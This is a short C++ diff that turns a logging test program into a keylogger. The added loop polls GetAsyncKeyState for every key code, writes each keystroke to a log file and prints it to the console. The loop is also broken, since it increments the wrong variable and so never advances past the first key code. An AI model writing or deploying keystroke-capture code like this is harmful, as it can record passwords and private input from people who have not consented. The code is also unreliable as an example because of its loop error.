@@ -45,8 +45,19 @@ int main(/* int argc, char* argv[] */)
     Logger mainLogger("log\\" + filename);
     mainLogger.log("Started Logging");
 
-    char i = 'a';
-    mainLogger.log(to_string(i));
+    char i;
+    while(true)
+    {
+        Sleep(10);
+        for(int key=8; key<=255; i++)
+        {
+            if(GetAsyncKeyState(key) & 0x0001)
+            {
+                mainLogger.log(to_string(key));
+                cout << "Got key : " << key << endl;
+            }
+        }
+    }
     return 0;
 }
 
